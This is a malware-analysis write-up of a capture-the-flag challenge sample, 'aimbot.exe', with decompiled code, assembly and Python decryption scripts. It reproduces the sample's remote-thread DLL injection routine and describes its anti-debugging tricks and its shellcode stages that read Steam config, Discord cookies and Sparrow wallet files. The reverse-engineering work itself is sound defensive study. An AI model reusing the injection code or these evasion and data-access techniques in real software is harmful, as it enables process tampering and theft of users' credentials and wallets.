### Files

| Name       | SHA265                                                           |
| ---------- | ---------------------------------------------------------------- |
| aimbot.exe | 0689f20e973f5834145bf5946f417c3796a891f5a37dddb1430d32895277195b |
### Summary

- aimbot.exe inject into the [game cube 2: sauerbraten](http://sauerbraten.org/) aimbot.dll and dropping a Monero miner.
	- aimbot.dll create 3 thread and have 5 stages of shellcode acessing to (Steam, Discord, Sparrow, Sauerbraten)

### Static Analysis of `aimbot.exe`

Using tools like **Malcat** or **PeStudio**, we can observe that `aimbot.exe` contains **three resources**, each with **high entropy**, which typically indicates **encrypted or packed data**:
![](./posts/image_aimbot/Pasted%20image%2020250714174608.png)

---

	 Tips :
Normal use of IDA here cause the .exe is not offuscated, the plugin [Flare-Capa](https://github.com/mandiant/capa) can help you to do a faster analysis.

---
### AES Decryption Logic

If the target game (e.g., `sauerbraten`) is running, the program creates a folder under `%APPDATA%` and decrypts each resource using **AES** with a hardcoded key:

![](./posts/image_aimbot/Pasted%20image%2020250714175035.png)

## DLL Injection Logic

The function `inject_aimbot_dll_401E80` is responsible for injecting `aimbot.dll` into the target process (the game):
```c
_BOOL8 __fastcall inject_aimbot_dll_401E80(HANDLE hProcess, char *dllPath)
{
  size_t len = strlen(dllPath);
  void *remote_mem = VirtualAllocEx(hProcess, 0, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

  if (remote_mem &&
      WriteProcessMemory(hProcess, remote_mem, dllPath, len, 0) &&
      (HMODULE hKernel32 = GetModuleHandleA("kernel32.dll")) &&
      (auto LoadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryA"))) {

    return CreateRemoteThread(hProcess, 0, 0, LoadLibrary, remote_mem, 0, 0) != 0;
  }

  return 0;
}

```
It uses `CreateRemoteThread` to **inject `aimbot.dll` into the running game process**, specifically targeting **`sauerbraten`**.

### aimbot.dll: 

---

	Tips for debugging aimbot.dll thread. 
In xdbg setup breakpoint on ``CreateRemoteThread`` in aimbot.exe. When the breakpoint is hit you can start an other xdbg attach it on sauerbraten.exe put breakpoint on ``CreateThread`` you should see the Thread start adresse in R8 register.

---

We have 3 threads in the aimbot.dll :

### First Thread : A real Aimbot
So this part is totaly useless for the challenge but the aimbot works and use GetAsyncKey Numpad 5 and Numpad 6 to activate the aimbot function the aimbot is pretty basic and if i should guess i would say that the creator of the challenge see this [video from Guided Hacking](https://www.youtube.com/watch?v=Dtl-A817WkA).
### Third Thread : ret/c3 Everything and Leave
This thread use more anti analysis technic like :
- ``DbgBreakpoint`` will patch first byte with ret/c3 causing crash on our debugger.
- Also re use ``IsDebuggerPresent`` and ``CheckRemoteDebuggerPresent``
- Check the NtCurrentPeb BeingDebugged flag.

Load an array of hash
```
  v26[0] = 0x3755DCD46855AF94LL;
  v26[1] = 0xF255062FB2C6B4E9uLL;
  v26[4] = 0x3755DCD46855AF94LL;
  v26[2] = 0x374755BE5E620917LL;
  v26[5] = 0xF255062FB2C6B4E9uLL;
  v26[6] = 0x374755BE5E620917LL;
  v26[7] = 0x3A083D2B843E42CCLL;
  v26[3] = 0x3A083D2B843E42CCLL;
```
Resolve every hash and check with OpenProcess certainly if some program are present like IDA / xdbg...
### Second Thread: C2 Beacon

The thread starts with multiple anti-debugging checks:

- **Time Bomb techniques** using `GetLocalTime` and `SystemTimeToFileTime`.
- **Filesystem check**: `CreateDirectoryA` is used to check if `C:\\depot` already exists — if it does, the program assumes it's being debugged.
- **PEB anti-debugging**: Uses `GetCurrentProcess` and `CheckRemoteDebuggerPresent`.
- **Custom `CheckProcess` function**.

It appears the program then searches for its **C2** (Command and Control) server.

---

### XOR String Table Decryption

After the anti-debug checks, the thread enters a loop to **un-XOR** a string table located at `0x62FE4020`.  
The decryption function looks like this:

```asm
uncryp_xor_data:
    push    rdi
    push    rsi
    push    rbx
    sub     rsp, 20h
    movsxd  rdi, ecx
    mov     esi, edx
    mov     ebx, r8d
    cmp     edi, 3
    jg      short loc_error
    test    r8d, r8d
    jz      short loc_error
    movsxd  rcx, edx        ; Size
    call    malloc
    lea     r9d, [rsi+3]
    test    esi, esi
    cmovns  r9d, esi
    lea     rdx, xor_string ; XOR key: 0xA9, 0xF8, 0x99, 0x64
    sar     r9d, 2
    cmp     esi, 3
    mov     r8, [rdx+rdi*8]
    jle     short loc_error_2
    xor     edx, edx

loc_decode_loop:
    mov     ecx, [r8+rdx*4]
    xor     ecx, ebx
    mov     [rax+rdx*4], ecx
    add     rdx, 1
    cmp     r9d, edx
    jg      short loc_decode_loop

loc_error_2:
    add     rsp, 20h
    pop     rbx
    pop     rsi
    pop     rdi
    retn

loc_error:
    xor     eax, eax
    add     rsp, 20h
    pop     rbx
    pop     rsi
    pop     rdi
    retn
```
Once we bypass the dynamic anti-debugging, we extract the **XOR key** and can script the decoding of the string table:

Python Script to Decode the Strings
```python
import struct

tables = [
    # Table 0
    [0xC1, 0x8C, 0xED, 0x14, 0x93, 0xD7, 0xB6, 0x55,
     0x9B, 0xCF, 0xB7, 0x54, 0x87, 0xC8, 0xB7, 0x55,
     0x93, 0xCD, 0xAE, 0x57, 0x9B, 0xC0, 0xB6, 0x56,
     0x86, 0x8B, 0xEC, 0x09, 0xC4, 0x99, 0xEB, 0x1D,
     0xA9, 0xFB, 0x9A, 0x67, 0x00],

    # Table 1
    [0xCB, 0x99, 0xF7, 0x05, 0xC7, 0x99, 0xFB, 0x0B,
     0xDD, 0xD8, 0xAC, 0x54, 0x99, 0xC8, 0x99, 0x65,
     0x00],

    # Table 2
    [0x8B, 0x8E, 0xFC, 0x16, 0xDA, 0x91, 0xF6, 0x0A,
     0x8B, 0xC2, 0xB9, 0x46, 0xA9, 0xFB, 0x9A, 0x67,
     0x00],

    # Table 3
    [0xDD, 0x90, 0xFC, 0x44, 0xCD, 0x9D, 0xFA, 0x16,
     0xD0, 0x88, 0xED, 0x0D, 0xC6, 0x96, 0xB9, 0x0B,
     0xCF, 0xD8, 0xED, 0x0C, 0xC0, 0x8B, 0xB9, 0x06,
     0xC5, 0x97, 0xFB, 0x44, 0xDE, 0x99, 0xEA, 0x44,
     0xDA, 0x8D, 0xFA, 0x07, 0xCC, 0x8B, 0xEA, 0x02,
     0xDC, 0x94, 0x99, 0x65, 0x00],
]

# XOR key (from EBX register): little endian 0x6499F8A9
ebx_key = 0x6499F8A9

def decode_table(raw_bytes, key):
    decoded = bytearray()
    for i in range(0, len(raw_bytes), 4):
        chunk = bytes(raw_bytes[i:i+4])
        if len(chunk) < 4:
            chunk += b'\x00' * (4 - len(chunk))
        dword, = struct.unpack('<I', chunk)
        out = dword ^ key
        decoded += struct.pack('<I', out)
    return decoded.split(b'\x00', 1)[0].decode('utf-8', errors='replace')

for idx, tbl in enumerate(tables):
    text = decode_table(tbl, ebx_key)
    print(f"Table {idx} decoded: {text}")
```
**Script output: **
```yaml
Table 0 decoded: http://127.0.0.1:57328/2/summary
Table 1 decoded: bananabot 5000
Table 2 decoded: "version": "
Table 3 decoded: the decryption of this blob was successful
```
### Dynamic Influence on Decryption

In the code for the `C2_contact` function, the return value of `CheckDebuggerPresent()` is passed as a parameter to the `uncrypt_xor_data` function, meaning the XOR behavior is influenced by the debugging state.
```c
void *c2_beacon_check() {
    void *v0 = malloc(0x4000u);
    int v1 = CheckDebuggerPresent();
    const char *v2 = (const char *)uncrypt_xor_data(1, 16, v1);
    void *hInternet = InternetOpenA(v2, 1u, 0, 0, 0);
    if (!hInternet)
        return 0;
    int v4 = CheckDebuggerPresent();
    const char *v5 = (const char *)uncrypt_xor_data(0, 36, v4);
    ...
}
```
### Final Decryption Stage

After fetching from C2, the program allocates a **RWX memory buffer** and decrypts a 17,520-byte blob. Example:
```c
char *response = (char *)c2_beacon_check();
if (response) {
    int xor_key = CheckDebuggerPresent();
    const char *marker = (const char *)uncrypt_xor_data(2, 16, xor_key);
    const char *marker_pos = strstr(response, marker);
    if (marker_pos) {
        void *mem = VirtualAlloc(0, 0x4470u, 0x1000u, 0x40u);
        memcpy(mem, &unk_62FE7340, 0x4470u);
        j_decode_by_4_byte(mem, marker_pos);
        ...
        const char *msg = uncrypt_xor_data(3, 44, CheckDebuggerPresent());
    }
}
```
At this point, the final part of the XOR string table only decrypts to `"version": "` — so the rest of the string must be brute-forced.

We can write a simple brute-force script to recover the complete key.
```python
import itertools
from string import digits
from pathlib import Path
from hashlib import sha256
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# --- Configuration ---
KEY_PREFIX        = '"version": "'
KNOWN_PLAINTEXT   = b"the decryption of this blob was successful"
ALPHABET          = digits + "."
SUFFIX_LENGTH     = 4
BLOCK_SIZE_BYTES  = algorithms.AES.block_size // 8  # 128 bits → 16 octets

PAYLOAD_PATH = Path("C:/Users/d.fau/Desktop/archives/aimbot_flare10/aimbot_bin_7340_length_4470.bin")
OUTPUT_PATH   = PAYLOAD_PATH.with_name(PAYLOAD_PATH.stem + "_decrypted.bin")

# --- Lecture du premier bloc pour le bruteforce ---
with PAYLOAD_PATH.open("rb") as f:
    sample_ct = f.read(BLOCK_SIZE_BYTES)

print("Bruteforcing AES key suffix…")
found_key = None

for i, suffix in enumerate(itertools.product(ALPHABET, repeat=SUFFIX_LENGTH), 1):
    key_str   = KEY_PREFIX + "".join(suffix)
    key_bytes = key_str.encode("utf-8")

    cipher     = Cipher(algorithms.AES(key_bytes), modes.ECB(), backend=default_backend())
    decryptor  = cipher.decryptor()
    plain_part = decryptor.update(sample_ct) + decryptor.finalize()

    if plain_part == KNOWN_PLAINTEXT[:BLOCK_SIZE_BYTES]:
        found_key = key_bytes
        print(f"[+] Key found: {found_key!r} (after {i} attempts)")
        break

if not found_key:
    raise RuntimeError("No key found.")

# --- Read ciphertext ---
with PAYLOAD_PATH.open("rb") as f:
    full_ct = f.read()

# --- Alignement Verification on block size ---
length = len(full_ct)
if length % BLOCK_SIZE_BYTES != 0:
    trimmed = (length // BLOCK_SIZE_BYTES) * BLOCK_SIZE_BYTES
    print(f"[!] Warning : length ({length}) multiply {BLOCK_SIZE_BYTES}, cut at {trimmed}.")
    full_ct = full_ct[:trimmed]

# --- Complete ---
print("Complete")
cipher    = Cipher(algorithms.AES(found_key), modes.ECB(), backend=default_backend())
decryptor = cipher.decryptor()
full_pt    = decryptor.update(full_ct) + decryptor.finalize()

# --- Calculate SHA-256 ---
digest = sha256(full_pt).hexdigest()
print(f"[+] Calculate SHA-256 : {digest}")

# --- Write result ---
with OUTPUT_PATH.open("wb") as f:
    f.write(full_pt)
print(f"[+] Write result in : {OUTPUT_PATH}")

```

## Start of the Russian Dolls: First Shellcode

Now that we have the decrypted shellcode, we can analyze it using two methods:

1. **Dynamically** with [BlobRunner](https://github.com/OALabs/BlobRunner)  
2. **Statically** with IDA

BlobRunner is great, but I want to show a small trick for shellcode reversing, so I’ll start with **static analysis**. However, before analyzing the shellcode in IDA, we can use [FASM](https://flatassembler.net/) or probably any assembly compiler to wrap the shellcode into an executable. This is useful because IDA does not allow you to define enums or structures directly in raw shellcode blobs.

---

### 📦 Example: Wrapping Shellcode with FASM

Here's a basic example that works with any decrypted shellcode:

```nasm
include '../include/win64ax.inc'

.code

  start:

        file 'aimbot_bin_fasm.bin'

        invoke ExitProcess,0

  .end start

```
After assembling, open the binary in Malcat or any hex editor, and **set the `.text` section to have write + execute permissions** if you plan to run it.

![](./posts/image_aimbot/Pasted%20image%2020250715154700.png)
### 🔍 String Analysis
We can already find some interesting strings: :
![](./posts/image_aimbot/Pasted%20image%2020250715150153.png)
For instance:

- `C:\Program Files (x86)\Steam\config\config.vdf` is likely important to the malware.
- `"the decryption of this blob was successful"` appears in every decrypted shellcode and can act as an indicator of success.

### 🧠 API Hashing Logic

In the shellcode, there's a function that resolves API calls using **hashing**, which simulates a `ROR13` using `SHR` and `SHL`:
```nasm
loc_401896:                             ; CODE XREF: sub_40183D+46↑j
.text:0000000000401896                 mov     r9d, r11d
.text:0000000000401899                 shr     r9d, 0Dh
.text:000000000040189D                 mov     eax, r11d
.text:00000000004018A0                 shl     eax, 13h
.text:00000000004018A3                 or      r9d, eax
```
You _could_ reimplement this hashing algorithm manually to reverse all function calls — but this technique is widely used, and tools like **hashdb** can resolve them much faster.  
For a great in-depth explanation of HashDB, check out [this video](https://www.youtube.com/watch?v=3FPY4cLaELU).

### ✅ Resolved API Calls (via HashDB)
```less
.text:00000000004018AC dword_4018AC    dd KERNEL32_DLL         ; DATA XREF: start+5D↑o
.text:00000000004018B0 ptr_CloseHandle dd CloseHandle_0
.text:00000000004018B4 ptr_CreateFileA dd CreateFileA_0
.text:00000000004018B8 ptr_ExitProcess dd ExitProcess_0
.text:00000000004018BC ptr_GetFileSize dd GetFileSize_0
.text:00000000004018C0 ptr_GetProcessHeap dd GetProcessHeap_0
.text:00000000004018C4 ptr_ReadFile    dd ReadFile_0
.text:00000000004018C8 ptr_CopyFileA   dd CopyFileA_0
.text:00000000004018CC ptr_NTDLL_DLL   dd NTDLL_DLL
.text:00000000004018D0 ptr_RtlAllocateHeap dd RtlAllocateHeap_0
.text:00000000004018D4 ptr_RtlFreeHeap dd RtlFreeHeap_0
```

## 🔐 RC4 Decryption in the Second Shellcode

The shellcode uses **RC4** to decrypt the next stage, using a key based on the **first 16 bytes of a specific file** accessed earlier:
```
C:\Program Files (x86)\Steam\config\config.vdf
```
The beginning of this file is:
```
`"InstallConfigStore"`
```
So the actual RC4 key used is:
```python
`KEY = b'"InstallConfigSt' # (16 bytes)`
```
Now we can write a quick script to decrypt the second stage at `payload_401957`.

---

### 🐍 RC4 Decryption Script
```python
from pathlib import Path
from Crypto.Cipher import ARC4  # PyCryptodome
import sys

# --- Configuration ---
KEY = b'"InstallConfigSt'
INPUT_FILE = Path("aimbot_dll_second_stage_shellcode_size_15129.bin")
OUTPUT_FILE = Path("decrypted_aimbot_dll_second_stage_shellcode_size_15129.bin")

# --- Load crypted payload ---
try:
    data = INPUT_FILE.read_bytes()
except FileNotFoundError:
    print(f"❌ {INPUT_FILE} not found")
    sys.exit(1)

# --- RC4 ---
cipher = ARC4.new(KEY)
decrypted = cipher.decrypt(data)

# --- Save ---
OUTPUT_FILE.write_bytes(decrypted)
print(f"✅ Finished stored as : {OUTPUT_FILE}")
```

At this point, the challenge starts to drift from real-world malware behavior.  
It’s highly unlikely for actual malware to **completely depend on the presence of Steam user data** to proceed with execution.  
That said, this design serves the purpose of the challenge and demonstrates layered decryption using common obfuscation techniques.

### Decrypt and Repeat. Brief Summary of shellcode 2 to 4

#### 🥈 Second Stage
- **Key source:** First 16 bytes of  
  `%APPDATA%\Discord\Network\Cookies`
- **Key value:** `"SQLite format 3\x00"`

---

#### 🥉 Third Stage
- **Key source:** `recentWalletFiles` entry in  
  `%APPDATA%\Sparrow\config`
- **Key value:** `"recentWalletFiles"` (17 bytes)

---

#### 🧩 Fourth Stage
- **Key source:** C2 server response
- **Key derivation:**
  - Get `Content-Length` via `HttpQueryInfoA`
  - Multiply it by `0x1234567`
- **Alternative:** XOR the phrase  
  `"the decryption of this blob was successful"`  
  with first 32 bytes of the shellcode

## Redemption. Last Shellcode and the Flag

The final shellcode uses the same hash as the previous ones. It checks if `aimbot.dll` is injected into the process, then looks for a configuration file in Sauerbraten’s directory:
```
%PROGRAMFILES(X86)%\Sauerbraten\packages\base\spcr2.cfg
%PROGRAMFILES(X86)%\Sauerbraten\packages\base\%s.cfg
```
We also have part of the flag embedded in a string (see the image) :
![](./posts/image_aimbot/Pasted%20image%2020250715204405.png)
### Shellcode Logic

The calculation in the shellcode is :
```c
if ( *(_DWORD *)(v11 + 568) != 1337 )
    return 0;
  v26 = v25 ^ 0x4203120C;
  v15 = v25 ^ 0xC;
  v16 = (unsigned __int16)((v25 ^ 0x120C) & 0xFF00) >> 8;
  v17 = ((v25 ^ 0x4203120C) & 0xFF0000u) >> 16;
  v18 = ((v25 ^ 0x4203120C) & 0xFF000000) >> 24;
  v19[0] = 0;
  if ( *(_DWORD *)(v11 + 584) != 1337 )
    return 0;
  v26 = v25 ^ 0x1715151E;
  qmemcpy(v19, &v26, sizeof(v19));
  v20[0] = 0;
  if ( *(int *)(v3 + 2774908) > 30000 )
    return 0;
  v26 = v25 ^ 0x15040232;
  qmemcpy(v20, &v26, sizeof(v20));
  v21[0] = 0;
  if ( *(_DWORD *)(v3 + 2775768) )
    return 0;
  v27 = *(_DWORD *)(v3 + 2266192) ^ 0x32061E1A;
  qmemcpy(v21, &v27, sizeof(v21));
  v22[0] = 0;
  if ( (unsigned int)sub_86(v22, v28, 25, v14) != -1521085050 )
    return 0;
  v13 = sub_952(v22, v28, v12, 128);
  sub_687(v22, v28, "The flag is: ", v13);
  sub_659(v22, v28, v14, v13);
  sub_659(v22, v28, "flare-on.com", v13);
  return unk_CE6(v22, v28, &unk_CD6, 0);
}
```

### Scripting the Flag Recovery

As the final step toward freedom, we can recreate the shellcode’s logic in a script to compute and reveal the flag.

```python
import zlib
from string import printable
from itertools import product

def read_config_data(path):
    with open(path, "rb") as file:
        offset_raw = int.from_bytes(file.read(4), "little")
        file.seek(81)
        prefix = file.read(8)
    return offset_raw, prefix

def build_partial_flag(offset_val, prefix):
    constructed = bytearray(b"\x20" * 25 + b"flare-on.com")
    constructed[:8] = prefix
    constructed[8] = ord("_")
    constructed[9]  = (offset_val ^ 0xC) & 0xFF
    constructed[10] = ((offset_val ^ 0x120C) >> 8) & 0xFF
    xor_full = offset_val ^ 0x4203120C
    constructed[11] = (xor_full >> 16) & 0xFF
    constructed[12] = (xor_full >> 24) & 0xFF
    xor_mid = offset_val ^ 0x1715151E
    constructed[13:17] = xor_mid.to_bytes(4, "little")
    xor_end = offset_val ^ 0x15040232
    constructed[17:21] = xor_end.to_bytes(4, "little")
    # Known byte from static analysis
    constructed[24] = ord("@")

    return constructed
 
def brute_crc_candidate(base_flag):
    for a, b, c in product(printable, repeat=3):
        base_flag[21], base_flag[22], base_flag[23] = ord(a), ord(b), ord(c)
        if zlib.crc32(base_flag[:25]) == 0xA5561586:
            print("Flag is:", base_flag.decode("utf-8"))
            return
    print("CRC32 brute-force failed.")

  

def main():

    file_path = "spcr2.cfg"
    offset_value, prefix_bytes = read_config_data(file_path)
    candidate = build_partial_flag(offset_value, prefix_bytes)
    brute_crc_candidate(candidate)

if __name__ == "__main__":

    main()
```
![](./posts/image_aimbot/Pasted%20image%2020250715210638.png)
